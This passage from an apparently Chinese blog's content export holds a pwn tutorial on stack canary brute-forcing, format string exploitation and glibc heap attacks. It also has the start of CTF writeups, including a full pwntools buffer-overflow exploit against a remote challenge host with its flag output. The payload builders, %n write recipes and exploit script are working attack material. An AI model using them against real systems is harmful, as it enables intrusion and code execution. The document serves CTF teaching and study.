都一样（直到父进程重启）。也就是说，每次连接的时候，canary的值都一样。 除此之外，进程在 exec 时才做一次 ASLR 随机化：PIE 基址、libc 基址、栈基址、canary 等都在这时确定。 并且fork() 不会重新随机化地址空间，而是把父进程当前的内存映射按COW（copy on write）原样克隆给子进程。 因此，同一轮服务存活期间，所有子进程都会共享这些不变的东西： stack canary 值（最低字节 0x00）， PIE / libc 的装载基址（所以代码里的绝对返回地址一致）， 栈/堆/各段的虚拟地址布局（所以函数帧的 saved RBP 和 RET 会落在相同的虚拟地址，并且内容一致： saved rbp 是上个帧的栈地址； ret 是固定的“调用点下一条指令”的地址。调用序列相同 → 它们在每个子进程里都相同。） 所以说在这种情况下，我们可以根据Orcacle来一位一位地爆破canary的值：一位一位地覆盖canary的值，根据程序是否有正常执行之后的内容来判断尝试是否正确。 4. 主线程生成了一个子线程来处理所有的逻辑。 在Linux (glibc) x86_64环境下： 主线程：栈（Stack）和 TLS（Thread Local Storage）通常在内存中相距甚远。栈在极高的内存地址向下增长，而 TLS 位于加载的库附近。 子线程 (pthread)：栈和 TLS 是紧邻的。pthread_create 会使用 mmap 分配一块连续的内存区域作为该线程的栈空间。 内存视图： 1234567891011121314151617181920212223242526272829高地址 (High Address)+-------------------------+| TLS / TCB | (线程控制块)| ----------------------- || ... || stack_guard (Master) | &lt;-- 真正的金丝雀值 (fs:0x28)| ... || tcbhead_t |+-------------------------+ &lt;--- Stack Base (初始栈顶指针 SP)| ... || Previous Frames | (更早的函数栈帧)| ... |+-------------------------+| Return Address | &lt;-- 想要覆盖掉的返回地址+-------------------------+| [ Stack Canary ] | &lt;-- (当前函数的金丝雀)+-------------------------+| [ buf ] | &lt;-- 溢出点| || || || ^ || | | (栈空间)| Stack || |+-------------------------+ &lt;--- Stack Limit (当前栈底)| Guard Page | (保护页，触碰即导致段错误)+-------------------------+低地址 (Low Address) 程序退出时，会将栈里的canary值与master canary的值进行比较，如果不一样就会直接退出。 所以如果可以同时覆盖掉栈里的canary和TLS中的master canary，便可以绕过canary的检测进行任意的ROP。 注意：大部分指针只接受valid的值或者是null，所以在这种需要覆盖很多内容的情况时需要格外注意。（需要一点一点debug，非常折磨） 格式化字符串漏洞 Format String Vulnerability我们首先来看一下什么是格式化字符串函数。 格式化字符串函数格式化字符串（ format string）函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。 可以参考这个定义： The format string is a character string which contains two types of objects: plain characters, which are simply copied to the output channel, and conversion specifications, each of which causes conversion and printing of arguments. （来源：https://ocaml.org/manual/5.0/api/Printf.html） 一般来说，格式化字符串在利用的时候主要分为三个部分 格式化字符串函数 格式化字符串 变量，可选 例子： 1234567# include &lt;stdio.h&gt;int main(void)&#123; int i = 10; printf(&quot;%d\\n&quot;, i); // %d是输出控制符，d 表示十进制，后面的 i 是输出参数* return 0;&#125; 格式化字符串函数分为输入和输出，其中 - 输入： 函数 说明 scanf() 从标准输入读取数据 基本语法： 1scanf(&quot;格式字符串&quot;, &amp;变量1, &amp;变量2, ...); 例子： 1234567891011# include &lt;stdio.h&gt;int main(void)&#123; int age; float height; char name[20]; scanf(&quot;%d %f %s&quot;, &amp;age, &amp;height, name); return 0;&#125; 注意：scanf(&quot;%s&quot;, name); 不需要加 &amp;，因为数组名本身就是地址。 - 输出： 函数名 说明 printf 向标准输出（通常是终端）打印格式化字符串 fprintf 向指定文件流打印格式化字符串（如 stderr, 文件指针等） sprintf 将格式化的字符串写入字符数组（注意缓冲区溢出风险） snprintf 将格式化的字符串写入字符数组，指定最大写入长度，更安全 asprintf 将格式化字符串写入动态分配的内存（GNU 扩展，非标准 C） dprintf 向指定的文件描述符写入格式化字符串（POSIX，常用于系统编程） vprintf 类似 printf，但参数通过 va_list 传递（用于变参函数） vfprintf 类似 fprintf，参数为 va_list vsprintf 类似 sprintf，参数为 va_list（不安全） vsnprintf 类似 snprintf，参数为 va_list（推荐用于变参安全格式化） 格式化字符串正如上面的定义里说的，格式化字符串里除了明文还有格式化占位符。我们这里来重点关注一下这个格式化占位符。 格式化占位符（conversion specifications）的语法如下： 1%[parameter][flags][field width][.precision][length]type - Parameter：指定用于格式化的参数位置（从1开始） 字符 说明 n$ 其中n是参数位置 例子： 12printf(&quot;%2$d %1$d&quot;, 11, 22);// 会输出 22 11 - Flags： 标志 说明 - 左对齐（默认是右对齐） + 总是显示正号或负号（例如 +10） (空格) 正数前加空格，负数前加负号 0 用0填充未占满的宽度 # 对于%o、%x、%X等，添加前缀（如0x）；对于%f等，始终包含小数点 - Field Width：指定最小输出字符数，不足时用空格（或0）填充，如果要使用变量指定宽度，可以用 *。 例子： 12345printf(&quot;%d&quot;, 42);// 会输出 &quot; 42&quot; （前面有3个空格）printf(&quot;%*d&quot;, 5, 42);// 会输出 &quot; 42&quot; （前面有3个空格） - Precision：指定数字小数点后的位数或字符串的最大输出长度： 对于浮点数（如 %f）：表示小数点后保留的位数，如 %.2f 对于字符串（如 %s）：表示最大输出字符数，如 %.5s 可以使用 * 表示由参数动态提供 - Length：指出浮点型参数或整型参数的长度 修饰符 说明 hh signed char 或 unsigned char h short 或 unsigned short l long 或 unsigned long ll long long 或 unsigned long long L long double（用于%Lf） z size_t t ptrdiff_t j intmax_t 或 uintmax_t 例子： 123456789101112131415161718192021222324252627282930313233343536373839#include &lt;stdio.h&gt;#include &lt;stdint.h&gt;#include &lt;stddef.h&gt;int main() &#123; signed char a = -5; printf(&quot;%hhd\\n&quot;, a); // 会输出 &quot;-5&quot; short s = 32000; printf(&quot;%hd\\n&quot;, s); // 会输出 &quot;32000&quot; long l = 123456789L; printf(&quot;%ld\\n&quot;, l); // 会输出 &quot;123456789&quot; long long ll = 9223372036854775807LL; printf(&quot;%lld\\n&quot;, ll); // 会输出 &quot;9223372036854775807&quot; long double ld = 3.141592653589793238L; printf(&quot;%Lf\\n&quot;, ld); // 会输出 &quot;3.141593&quot;（默认保留6位小数） size_t sz = 100; printf(&quot;%zu\\n&quot;, sz); // 会输出 &quot;100&quot; ptrdiff_t diff = -8; printf(&quot;%td\\n&quot;, diff); // 会输出 &quot;-8&quot; intmax_t im = 9223372036854775807; printf(&quot;%jd\\n&quot;, im); // 会输出 &quot;9223372036854775807&quot; return 0;&#125; - Type：也称转换说明（conversion specification/specifier），指定具体的数据类型，有以下选择 字符 说明 %p 打印指针（十六进制地址） %x 打印十六进制（小写） %s 打印字符串（char*），即打印某个地址里的内容。 %.2f 打印浮点数，保留小数点后2位 %f 打印浮点数（float/double） %c 打印单个字符（char） %d 打印十进制整数（int） %% 输出一个百分号 % 其中只有Type是必须要给的，其他均可以省略。 例子： 1234567891011121314151617181920#include &lt;stdio.h&gt;int main() &#123; int i = 123; float pi = 3.14159; char letter = &#x27;A&#x27;; char name[] = &quot;hello&quot;; int hex = 255; printf(&quot;整数：%d\\n&quot;, i); printf(&quot;浮点数（默认）：%f\\n&quot;, pi); printf(&quot;浮点数（保留两位）：%.2f\\n&quot;, pi); printf(&quot;字符串：%s\\n&quot;, name); printf(&quot;字符：%c\\n&quot;, letter); printf(&quot;十六进制：%x\\n&quot;, hex); printf(&quot;百分号：%%\\n&quot;); return 0;&#125; 注意：在第二部分一定要给定变量，如果没有给，则会从错误的内存地址读取数据，导致不可预期的行为。 此外还有一个比较特殊的格式符：%n 。这个格式符会让 printf 把当前已经打印的字符数量写入n。（或者说写入给定的地址。） 比如说下面这个例子（正常用法） 12345678#include &lt;stdio.h&gt;int main() &#123; int n; printf(&quot;hello%n&quot;, &amp;n); return 0;&#125; n的值会被存储为5。 由于它的特殊性以及危险性，很多现代系统在libc中禁用了 %n，或者在格式化函数上增加了保护（如glibc中对 %n 的格式检查）。 不过正是因为它的危险性所以我们在pwn里经常会用它来修改内存数据 变量希望输出的变量。 格式化字符串漏洞正常情况：在进入printf函数之后，函数会首先获取第一个参数，一个一个读取其字符会遇到两种情况 当前字符不是%，直接输出到相应标准输出。 当前字符是%， 继续读取下一个字符 如果没有字符，报错 如果下一个字符是%, 输出% 否则根据相应的字符，获取相应的参数，对其进行解析并输出 例子： 12345678910#include &lt;stdio.h&gt;int main() &#123; int a = 10; float b = 3.14f; // 注意：传入变参会被“默认实参提升”为 double char *str = &quot;hello&quot;; printf(&quot;Int: %d, Float: %f, String: %s\\n&quot;, a, b, str); return 0;&#125; 参数是怎么传进 printf 的（32-bit 和 64-bit）32-bit（cdecl）——全部走栈 变参有“默认实参提升（default argument promotions）”：float 会提升为 double（占 8 字节），char/short 提升为 int。 典型调用时栈的示意（自上而下是低地址 → 高地址，或按“调用现场从下往上”理解也可以）： 1234567891011+------------------------------+| 返回地址（printf 结束后跳转） |+------------------------------+| 格式字符串地址 | --&gt; &quot;Int: %d, Float: %f, String: %s\\n&quot;+------------------------------+| 参数3（str，4B） | --&gt; 指向 &quot;hello&quot;+------------------------------+| 参数2（b，double，8B） | --&gt; 3.14（已提升）+------------------------------+| 参数1（a，4B） | --&gt; 10+------------------------------+ printf 在解析到 %d/%f/%s 时，会从“第一个可变参数槽位”开始，依次取“4B/8B/指针”的值并格式化输出。 x86-64（System V ABI）——寄存器优先 + 溢出到栈 前 6 个整数/指针类参数：RDI, RSI, RDX, RCX, R8, R9 前 8 个浮点类参数：XMM0–XMM7（float 仍提升为 double） 变参函数还会准备一个寄存器保存区（register save area）和栈溢出区（overflow area）。va_list/va_arg 会按参数类型从对应区域顺序取值；寄存器名额用完后改从栈上取。 对应上面的例子，调用瞬间常见分配为： RDI = &quot;Int: %d, Float: %f, String: %s\\n&quot;（格式串） RSI = a（%d） XMM0 = b 的 double（%f） RDX = str（%s） 在64-bit架构下不是所有参数都在栈上。printf 通过 va_list 维护“当前吃到第几个槽位”，按类型先从寄存器保存区拿，超出再从栈拿；这就是为什么64-bit 下偏移（offset）和 32-bit 不同，必须现场探测或用 %n$ 显式参数序号。 特殊情况以及偏差值当我们在使用格式化字符串函数但未提供后续实参（即只给了 fmt 一个参数）时： 123456#include &lt;stdio.h&gt;int main() &#123; printf(&quot;Hello %x %x %x %x&quot;); return 0;&#125; printf 在扫描到每个转换说明（%...）时，会依据 ABI 约定通过 va_arg 按顺序从可变参数起始位置检索下一参数槽位的内容：在 x86（32-bit） 上对应为栈槽，在 x86-64 SysV 上对应为寄存器保存区（reg_save_area）以及栈溢出区（overflow_arg_area）。 由于这些槽位未被显式赋值，读取到的将是相应存储区域中的现存（残存）/未定义数据，于是被按 %x/%p/%s 等格式解释并输出。进一步地，当该顺序读取过程推进到包含本次输入缓冲区（例如位于栈、堆或 .bss）的地址范围，且首次取到我们预置的标记（如 AAAA...）时，该标记对应的参数序号就称为偏差值 k（即从“第一个可变参数槽位”开始计数，到首次命中标记之间的槽位数量）。这样一来，我们即可使用显式参数序号（如 %k$p, %k$s, %k$n）稳定地指向目标槽位进行泄露或写入。 漏洞表现在CTF的题目里这个漏洞一般的表现如下： 12345678#include &lt;stdio.h&gt;int main() &#123; char buf[100]; fgets(buf, sizeof(buf), stdin); printf(buf); // 会将我们的输入直接当成格式字符串并处理 return 0;&#125; 我们可以利用这个漏洞读取栈上的内容（如变量值、返回地址等）或者通过 %n 格式符（就是我们之前提到的那个危险的格式符）向指定内存地址写入数据。 Exploit技巧读取栈上的内容12printf(&quot;%x %x %x&quot;);// bffff5c4 80484f0 1 12printf(&quot;%p %p %p&quot;);// 0xbffff5c4 0x80484f0 0x1 %x ：以十六进制整数形式输出栈上的内容。 %p ：以指针形式（十六进制地址）输出栈上的内容。 123payload = b&quot;%p &quot; * 40payload = b&quot;%x &quot; * 40 或者也可以使用%n$p： 1payload = &quot;%1$p %2$p %3$p %4$p %5$p %6$p %7$p %8$p %9$p %10$p&quot; 1payload = &quot; &quot;.join([f&quot;%&#123;i&#125;$p&quot; for i in range(1, 61)]).encode() 读取任意地址的字符串 %s：把 栈上的值当成一个指针地址，并尝试打印这个地址指向的内存，直到遇到 \\0。 假设栈上某个参数的值是： 10x08049000 → 指向 &quot;HelloWorld&quot; 用 %x和%p会输出 1280490000x8049000 用%s则会输出 12printf(&quot;%s&quot;);HelloWorld 一般流程 确定偏移S（offset）： 输入形如 AAAA,%p,%p,%p... 看第几个 %p 能读出我们可控的标记（比如 0x41414141），得到偏移 S。 使用下面的方法构造payload 假如我们确定了偏移，并且知道了flag的具体地址，那么我们便可以用以下的payload直接读取flag的内容： 123def fmt_read_addr_payload(offset, addr, k=1): fmt = f&quot;%&#123;offset + k&#125;$s&quot;.encode() return fmt + b&quot;A&quot;*(8 * k - len(fmt)) + p64(addr) 其中： offset是我们确定的偏移 addr是我们希望读取的内容的地址 8*k主要用于对齐。（如果k=1不行，可以尝试k=4，貌似比较稳。） 因为p64(addr) 直接接在格式串后面，如果没有按8字节对齐，它大概率不会正好落在第offset个槽位上，也就会导致读取出问题。 写入一般流程 确定偏移 S（offset）：输入形如 AAAA,%p,%p,%p... 看第几个 %p 能读出我们可控的标记（比如 0x41414141），得到偏移 S。 放置目标地址（避免\\x00截断）： 把“格式化指令（全 ASCII）”放在前面； 把目标地址（或一串地址）放在 payload 末尾； 用位置参数%K$... 来点名这些地址（K 从 S + ceil(len(fmt_ascii)/8) 起）。 对齐/padding： written = 到当前为止已输出字符数； 目标值 want（希望被写入到内存里的数值，按写入宽度取模）； 计算： 1234567base = 256 #（%hhn，1字节）base = 65536 #（%hn，2字节）base = 2**32 #（%n，4字节）base = 2**64 #（%ln/%lln，8字节）pad = (want - (written % base)) % base# 如果 pad == 0，为了稳妥可用 pad = base（等价“加 0”） base为取值范围，分别等于1，2，4，8字节的最大值。 然后输出 %padc（或其他等价方式）把 written 调到想要的值。 执行写入： %K$hhn 写 1 字节 %K$hn 写 2 字节 %K$n 写 4 字节（int*） %K$ln/%K$lln 写 8 字节（long*/long long*，在 x86_64 都是 8Byte） 对 %hn/%n/%ln 这类多字节写，最好按“从小到大”的目标值排序写入，避免 padding 需要“回绕”到很大的数。或者直接用逐字节写 %hhn。 写 1 字节（%hhn）示例 1：把 pwnme_addr 的最低 1 字节写成 0x90 假设已经测得偏移 S = 10，并用 BASE = S + ceil(len(fmt_ascii)/8) 计算出第一个地址是第 K=BASE 个参数位。 123456# 目标：*(uint8_t*)pwnme_addr = 0x90# 只需让 written % 256 == 0x90 (=144)payload =b&quot;%144c&quot; # written += 144b&quot;%K$hhn&quot; # 把 (written%256)=0x90 写进第 K 个参数指向的地址+ p32(pwnme_addr); 若此时 written % 256 不是从 0 开始，照公式算：pad = (0x90 - (written%256)) % 256，用 %padc 形成 padding。 fmtstr_payloadPwntools里有现成的高效构造这种payload的函数： 1fmtstr_payload(offset, writes, numbwritten=0, write_size=&#x27;byte&#x27;) （官方文档：https://docs.pwntools.com/en/dev/fmtstr.html ） 参数（摘译）： offset：第一个可控“参数槽”的位置（即你测出来的 %n$p 起点）。 writes：要写入的目标，字典 &#123;address: value, ...&#125;。（将value写进address里） numbwritten：调用 printf 前已经输出的字节数（影响对齐/填充计算）。 write_size：原子写入粒度，&#39;byte&#39;|&#39;short&#39;|&#39;int&#39;|&#39;long&#39; 等。 堆利用/Heap Exploitation堆利用（Heap Exploitation）和核心/最终目的是劫持分配器 (Hijacking the Allocator)，让其误以为敏感地址（如 GOT 表、栈上的返回地址、Hook 函数指针）是空闲链表里的一块普通内存，并将其分配给我们，以达到任意写入的目的。当然在此之前还需要信息泄露用于确定我们该往哪里进行写入。 首先先区分一下libc和glibc： libc（C Library）通常指的是标准 C 库。它是一套基础函数的标准规范。 比如说标准（libc）只规定了malloc和free怎么用。 glibc（GNU C Library）是 GNU 项目对上述 libc 标准的具体代码实现。 会决定具体如何管理堆内存（Chunk 结构、Bin 链表、Tcache 机制）。 Chunk（堆块）结构： 堆内存被划分为一个个 Chunk。每个 Chunk 包含头部信息（Header）和用户数据区 ： 头部字段 (Header)： prev_size：如果前一个物理相邻的 Chunk 是空闲的，这里存储前一个 Chunk 的大小；如果前一个是使用中的，这里归属于前一个 Chunk 的用户数据区 。 size：当前 Chunk 的大小，低 3 位用于存储标志位（如 prev_in_use，表示前一个块是否在使用中） 。 空闲时的指针： 当 Chunk 被释放（Free）后，用户数据区的前 16 字节会被复用为 fd (Forward Pointer) 和 bw/bk (Backward Pointer)，分别指向链表中的下一个和上一个空闲块 。 内存布局：堆是从低地址向高地址增长的。Chunk 的大小通常以 0x10（16字节）对齐 。 堆管理列表 (Bins)： glibc使用多种链表（Bins）来管理空闲的Chunk，以提高分配效率。常见的几种： Fastbin: 单向链表 (Singly-linked)，LIFO (后进先出) 。 管理小块内存，大小范围 [0x20, 0x80] 。 每个大小都有独立的链表 。 Tcache (Thread Local Cache): 最重要特性： glibc 2.26 引入，为了性能设计，每个线程独有。 单向链表，LIFO 。 大小范围 [0x20, 0x410] 。 分配和释放优先级最高，且默认不进行合并 。 每个链表最多容纳 7 个块 (Count=7) 。 Smallbin: 双向链表 (Doubly-linked)，FIFO 。 大小范围 [0x20, 0x400] 。 Unsorted Bin: 双向链表，仅有一个列表 。 作为缓存层，刚释放且未进入 Tcache/Fastbin 的块会先放入这里 。 Top Chunk: 位于堆顶部的巨大空闲块，当 bins 中没有合适的块时，从这里切割内存 。 1. 空闲块的合并机制 (Merging) glibc 为了防止内存碎片化，通常会尝试把相邻的空闲块合并成一个大块。 默认合并对象： 属于 双向链表（Smallbin, Largebin, Unsorted Bin）中的空闲块以及 Top Chunk 。 当你释放（free）这些块时，如果它们物理相邻，它们会立即合并。 Fastbin 的特殊情况： Fastbin默认不合并（为了速度）。 但是，当程序申请一个较大的内存块（Large Allocation）时，会触发 malloc_consolidate 函数 。 这个函数会清理 Fastbin，强制将里面的块进行合并，放入Unsorted Bin中。 Tcache 的特殊情况： Tcache Chunks 永远不会合并 。 这是Tcache速度极快的原因，也是它的缺点（容易导致堆碎片，但也容易被利用来保留特定大小的空闲块）。 2. Tcache 的核心特性 (Regarding tcaches) Tcache 是 glibc 为了提升多线程性能引入的机制，有几个关键特性： 优先级最高 (L1 Cache)： 它在大多数其他堆逻辑之前被填充和提取 。 这意味着：malloc 时先看Tcache有没有；free时先放进Tcache。只有Tcache满了或空了，才会去操作 Fastbin/Smallbin等。 容量限制 (Max-fill of 7)： 每个大小（Size Class）的链表最多只存 7 个 Chunk 。 攻击意义： 如果你想把一个块放入Fastbin或Unsorted Bin以触发更复杂的漏洞（如 Unsorted Bin Leak），你需要先free7个同大小的块把Tcache填满，第8个才会落入其他Bin。 管理结构在堆上 (On the heap)： Tcache的管理结构（tcache_perthread_struct，存着链表头指针数组）本身也是分配在堆上的 。 攻击意义： 如果你能劫持这个管理结构，你就能控制整个线程的堆分配。 安全检查 (Key)： Tcache是单向链表，原本不需要bk指针。 但是为了防止 Double Free（双重释放），glibc会在空闲Tcache Chunk 的bk位置存储一个 tcache key（通常指向 tcache_perthread_struct 的地址）。 当你释放一个块时，系统会检查 bk 位置是否等于这个 key，如果是，则遍历链表检查是否重复释放。 不同libc版本的安全检查以及分配策略都是不太一样的。 Glibc 2.31 1. Fastbin 的检查： Fastbin 是单向链表，性能仅次于 Tcache。 Malloc: alloc_size == stored size (Size Integrity) 含义： 当从 Fastbin 取出一个块时，系统会检查这个块头部的 size 字段，看它是否真的属于当前这个 Bin 的大小范围。 攻击后果： 如果你想伪造一个 Fastbin Chunk（比如在栈上伪造），你必须确保伪造地址的偏移处有一个正确的 size 数值，否则程序会崩溃。 Free: valid next size: 检查内存中下一个物理相邻块的大小字段是否合理。这是为了防止因溢出导致的元数据损坏。 addr != head (弱 Double Free 检查): 它只检查链表的头节点是不是当前要释放的地址。 绕过： 这就是经典的 ABA 问题。你释放 A，链表头是 A；你释放 B，链表头变成 B；你再次释放 A，因为此时链表头是 B (A != B)，检查通过。A 成功进入链表两次。 2. Smallbin的检查： Smallbin 是双向链表，管理较大内存，安全性最高。 Malloc: bk-&gt;fd == addr (Safe Unlink) 含义： 这是最著名的堆保护机制。当从双向链表取出一个块（Unlink）时，系统会检查：这个块的后一个块的前向指针，是否指回这个块本身？ 公式： P-&gt;bk-&gt;fd == P 攻击后果： 这使得经典的“Unlink 攻击”（通过修改 fd/bk 实现任意地址写）在现代 glibc 中基本失效，除非你能同时伪造好 fd 和 bk 指向的内存内容。 Free: chunk is in-use: 它会检查下一个物理相邻 Chunk 的 prev_in_use 位（P-bit）。如果 P-bit 为 0，说明当前块已经是空闲状态了，系统就会报错，防止 Double Free。 unsorted head is valid: 针对 Unsorted Bin 的完整性检查。 3. Chunk Consolidation (块合并) 这部分指的是当Smallbin/Largebin发生物理合并时（比如你释放一个块，它发现前一个块也是空闲的，就要合并成一个大块）。 prevsize == chunksize(p): 含义： 当前块的 prev_size 脚标，必须等于前一个块头部的 size。 目的： 防止 Off-by-one 漏洞利用（比如 Poison Null Byte 攻击）。如果攻击者偷偷改小了 prev_size 试图让堆管理器“吃掉”正在使用的内存，这个检查会拦截。 Valid doubly linked list pointers: 在合并过程中，被吞并的空闲块需要从链表中移除，此时会再次触发类似 Safe Unlink 的检查。 1. Malloc 时的检查：无 它不检查取出的 Chunk 大小是否正确。 它不检查指针是否对齐。 它直接相信链表头部的指针（FD）。 2. Free 时的检查： 虽然 malloc 不管，但在 free 时 Tcache 还是做了一些防御，主要是为了防止 Double Free。 valid stored size 检查你要释放的地址处的 size 字段是否合法（比如大小不能太离谱，且必须对齐）。 key/bk != tcache_key || chunk not in tcache list (Double Free 检查) 背景： Tcache 是单向链表，本来不需要 bk 指针。glibc 这里复用了 bk 的位置（用户数据的第 8-15 字节）来存放一个随机生成的 tcache_key（通常指向堆管理结构）。 逻辑： 当调用 free(ptr) 时： 系统先检查 ptr-&gt;bk 是否等于 tcache_key。 如果不等于： 系统认为这是一个新释放的块，直接放入链表，并把 key 写入 bk 位置。 如果等于： 系统怀疑你正在 Double Free。于是它会遍历整个链表，检查里面是不是真的已经有了这个 Chunk。 绕过思路： 如果能利用 Use-After-Free (UAF) 改写该 Chunk 的 bk 位置（把 key 覆盖掉），就可以绕过这个检查，再次释放它，从而实现 Double Free。 Glibc 2.41随着libc版本的更新，发生了很多的变化，所以很多针对老版本libc的heap exploitation的攻击没有办法应用在新版的libc里。 攻击方法1. Fastbin/Tcache FD Corruption (FD 指针篡改)利用 Use-After-Free (UAF) 实现任意地址分配（Arbitrary Chunk Allocation）。 场景： 针对单向链表（Tcache 或 Fastbin）。 步骤： 释放一个Chunk A，它进入空闲链表 。 利用悬挂指针（UAF）修改Chunk A的fd指针，将其指向目标地址&lt;victim&gt;（例如栈地址或 libc 中的 hook） 。 第一次malloc取出 Chunk A 。 第二次malloc就会返回 &lt;victim&gt; 地址，从而控制该区域内存 。 图示： 2. Size Corruption (大小篡改 / Overlapping Chunks)通过修改 Chunk 的头部大小字段，制造堆块重叠。 场景：内存中有连续的Chunk A, B, C。 步骤： 利用Chunk A的溢出漏洞，覆盖Chunk B的头部 。 将Chunk B的 size 改大（例如从 0x21 改为 0x41），使其覆盖到Chunk C 。 释放Chunk B 。 重新申请一个较大的内存（例如 0x38），系统会分配原 B 的空间，但由于大小已变，新的Chunk D会覆盖原本的Chunk C 。 结果： 攻击者可以通过编辑Chunk D来控制Chunk C的内容（即使用户认为 C 仍在使用中） 。 图示： 3. Smallbin Consolidation (Smallbin 合并攻击)利用的是 malloc_consolidate 和 unlink 机制来构造重叠块（Overlapping Chunks）或绕过某些限制。 前提： 利用 prev_size 和 prev_in_use 位的逻辑。 布局： 连续的 Chunk A, B, C, D。 步骤： 释放Chunk A（放入 Unsorted/Smallbin，建立合法的 fd/bk 指针） 。 利用Chunk B的溢出，修改Chunk C的头部： 将C的 prev_size 修改为 size(A) + size(B)（伪造前一个块非常大） 。 将C的 prev_in_use 标志位置0（欺骗 C 认为前一个大块是空闲的） 。 绕过检查 (glibc 2.29+)： 需要修改Chunk A的size字段，使其等于伪造的prev_size，以通过完整性检查 。 释放Chunk C 。 触发合并： glibc 检测到 C 的 prev_in_use 为 0，根据 prev_size 向后合并，吞并了正在使用的 Chunk B，与Chunk A合并成一个巨大的空闲块 。 重新申请一个大块E 。 结果： Chunk E完全包含了仍在“使用中”的 Chunk B，攻击者完全控制了 B 的数据 。 图示： 推荐工具 forkever (by haxkor) 功能： 允许模拟堆操作并支持检查点 (Checkpoints) 功能 。 作用： 在编写 Exploit 时，经常需要反复尝试某一步骤。这个工具可能类似于虚拟机的快照功能，让你在堆的某个特定状态下反复尝试不同的攻击载荷，而不需要每次都重新启动程序，大大提高了调试效率。 https://github.com/haxkor/forkever pwndbg-gui (by AlEscher) 功能： 为著名的 GDB 插件 pwndbg 提供图形化界面，并增强了堆上下文 (Heap Context) 的显示 。 作用： 原生的 GDB/pwndbg 是命令行界面，查看堆链表时比较抽象。这个工具通过 GUI 可视化展示 Bin 的状态，让你更直观地看到堆块是如何链接的。 https://github.com/AlEscher/pwndbg-gui ptrfind (by ChaChaNop-Slide) 功能： 寻找指针和指针链，以利用任意读写 (Arbitrary Read/Write) 。 作用： 在堆利用中，经常需要通过多级指针跳转找到目标地址（比如通过 environ 找栈地址）。这个工具能自动化寻找这些指针路径，省去了人工计算偏移的繁琐工作。 https://github.com/ChaChaNop-Slide/ptrfind heapvis (by Staeves) 功能： 专门针对 libc 2.31 版本的堆可视化工具 。 作用： 配合本课程讲授的 libc 版本（2.31），将抽象的堆内存布局画出来，帮助你理解 Chunk 的排列和状态。 https://github.com/Staeves/heapvis 学习资料 how2heap https://github.com/shellphish/how2heap Malloc Maleficarium 比较古早但很经典的文章。 https://packetstormsecurity.com/files/40638/MallocMaleficarum.txt.html 不知道为什么Chrome访问这个网址会有问题，但是Firefox就可以。 https://heap-exploitation.dhavalkapil.com/ 常用pwndbg命令123456789101112# 概览heap# 详细模式heap -v# 看某个地址附近/对应的 heap 信息heap 0x405000binstcache 题目分类 Pwn相关基础知识： HTB Questionnaire Writeup HTB Lesson Writeup Buffer Overflow： 结构体字段劫持： 攻防世界 hello_pwn Writeup ROP： ret2shellcode： HTB Regularity Writeup ret2text： CTF.show Pwn入门 Pwn 38 攻防世界 level0 Writeup TJCTF 2025 pwn/i-love-birds Writeup ret2plt： CTF.show Pwn入门 Pwn 40 攻防世界 level2 Writeup （32位程序） HTB You_know_0xDiablos Writeup （32位程序） ret2libc： CTF.show Pwn入门 Pwn 46 5 格式化字符串漏洞： HTB racecar Writeup（利用格式化字符串漏洞读取信息。） 攻防世界 CGfsb Writeup （利用格式化字符串漏洞修改目标变量的值。） 堆利用：","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"}]},{"title":"攻防世界 level0 Writeup","slug":"CTF/Pwn/攻防世界-level0-Writeup","date":"2025-05-12T12:31:45.000Z","updated":"2025-06-10T19:08:14.597Z","comments":true,"path":"2025/05/12/CTF/Pwn/攻防世界-level0-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level0-Writeup/","excerpt":"利用Buffer Overflow修改返回地址以调用目标函数。","text":"观察用ida打开拿到的文件会看到主程序（使用F5可以将机器码反编译成伪代码）： 查看 vulnerable_function： 发现read的漏洞。 接着便是需要查看Stack的结构。点击这里的buf便可以查看当前函数的stack结构： 可以发现先是存储当前的输入内容（期望长度为128），然后便是saved_registers（长度为8），最后才是return_address。 通过查看Exports可以发现callsystem这个函数及其地址： 1callsystem 0000000000400596 我们可以使用pwn里的p64()函数自动将一个整数打包成 64 位小端序（little endian）的字节串。因为大部分现代的架构使用的都是小端序。 1p64(0x400596) Exploit我们需要做的是发送一段内容，结构如下： 1payload = b&quot;A&quot; * 128 + b&quot;B&quot;*8 + p64(0x400596) 前面AB的部分会覆盖掉buf以及saved_registers，以至于可以用p64(0x400596)覆盖掉函数的返回地址，也就是说会直接调用callsystem这个函数。调用了之后只需要使用ls和cat flag命令即可读取flag。 Exploit代码： 1234567891011121314151617181920212223242526272829303132from pwn import *r = remote(&quot;61.147.171.105&quot;, 49676)res = r.recvline()print(res)payload = b&quot;A&quot; * 128 + b&quot;B&quot;*8 + p64(0x400596)r.sendline(payload)r.interactive()# [x] Opening connection to 61.147.171.105 on port 49676# [x] Opening connection to 61.147.171.105 on port 49676: Trying 61.147.171.105# [+] Opening connection to 61.147.171.105 on port 49676: Done# b&#x27;Hello, World\\n&#x27;# [*] Switching to interactive mode# ls# bin# dev# flag# level0# lib# lib32# lib64# cat flag# cyberpeace&#123;f400f63c7cea1e147b6960fc106b45f0&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"https://archer-baiyi.github.io/en/categories/CTF/"},{"name":"Pwn","slug":"CTF/Pwn","permalink":"https://archer-baiyi.github.io/en/categories/CTF/Pwn/"}],"tags":[{"name":"Pwn","slug":"Pwn","permalink":"https://archer-baiyi.github.io/en/tags/Pwn/"},{"name":"攻防世界","slug":"攻防世界","permalink":"https://archer-baiyi.github.io/en/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"}]},{"title":"攻防世界 level2 Writeup","slug":"CTF/Pwn/攻防世界-level2-Writeup","date":"2025-05-12T08:24:30.000Z","updated":"2025-06-10T19:08:52.443Z","comments":true,"path":"2025/05/12/CTF/Pwn/攻防世界-level2-Writeup/","permalink":"https://archer-baiyi.github.io/en/2025/05/12/CTF/Pwn/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-level2-Writeup/","excerpt":"通过Buffer Overflow修改返回地址以调用目标函数并传递参数。","text":"观察用ida打开文件查看main函数： 可以发现没有输入长度限制。 